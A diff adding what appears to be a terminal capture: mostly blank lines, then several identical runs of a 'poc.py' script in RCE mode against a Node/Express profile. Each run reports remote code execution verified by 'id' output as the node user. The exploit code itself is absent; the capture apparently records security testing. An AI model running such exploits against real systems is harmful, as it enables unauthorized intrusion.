@@ -1,0 +1,433 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+> python -u poc.py --profile n2s-ref-express-24.22.0-x86_64 --mode rce --timeout 30
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+> python -u poc.py --profile n2s-ref-express-24.22.0-x86_64 --mode rce --timeout 30
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+> python -u poc.py --profile n2s-ref-express-24.22.0-x86_64 --mode rce --timeout 30
+attempt=1/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=2/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=3/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=4/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=5/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=6/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=7/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=8/16 staged_position=0x137ed748
+PASS: RCE verified by fresh id output through the declared interface
+profile=n2s-ref-express-24.22.0-x86_64
+proof_channel=HTTP request socket stdout
+proof_command=id
+proof_stdout=uid=1000(node) gid=1000(node) groups=1000(node)
+successful_attempt=8
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+> python -u poc.py --profile n2s-ref-express-24.22.0-x86_64 --mode rce --timeout 30
+attempt=1/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=2/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=3/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=4/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=5/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=6/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=7/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=8/16 staged_position=0x137ed748
+PASS: RCE verified by fresh id output through the declared interface
+profile=n2s-ref-express-24.22.0-x86_64
+proof_channel=HTTP request socket stdout
+proof_command=id
+proof_stdout=uid=1000(node) gid=1000(node) groups=1000(node)
+successful_attempt=8
+
+
+
+────────────────────────────────────────────────────────────────────────────────
+> python -u poc.py --profile n2s-ref-express-24.22.0-x86_64 --mode rce --timeout 30
+attempt=1/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=2/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=3/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=4/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=5/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=6/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=7/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=8/16 staged_position=0x137ed748
+PASS: RCE verified by fresh id output through the declared interface
+profile=n2s-ref-express-24.22.0-x86_64
+proof_channel=HTTP request socket stdout
+proof_command=id
+proof_stdout=uid=1000(node) gid=1000(node) groups=1000(node)
+successful_attempt=8
+>
+
+
+────────────────────────────────────────────────────────────────────────────────
